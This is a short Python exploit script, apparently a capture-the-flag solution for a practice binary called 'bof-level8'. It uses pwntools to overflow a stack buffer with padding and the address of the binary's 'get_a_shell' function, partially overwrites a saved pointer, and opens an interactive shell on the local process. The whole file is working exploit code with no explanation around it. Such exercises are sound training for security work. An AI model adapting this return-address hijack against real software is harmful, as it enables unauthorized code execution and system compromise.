#!/usr/bin/env python

from pwn import *

context.terminal = "/bin/bash"
buf = 'A' * 80 + "\x00"

#c = Core('./core')
#buffer_addr = c.stack.find(buf)

e = ELF("./bof-level8")
addr_get_a_shell = e.symbols['get_a_shell']

buf = "RRRRRRRR" + p64(addr_get_a_shell)

buf = buf + "C" * (0x80 - len(buf)) + "\x20"

p = process('./bof-level8')
#gdb.attach(p)
p.send(buf)
p.interactive()
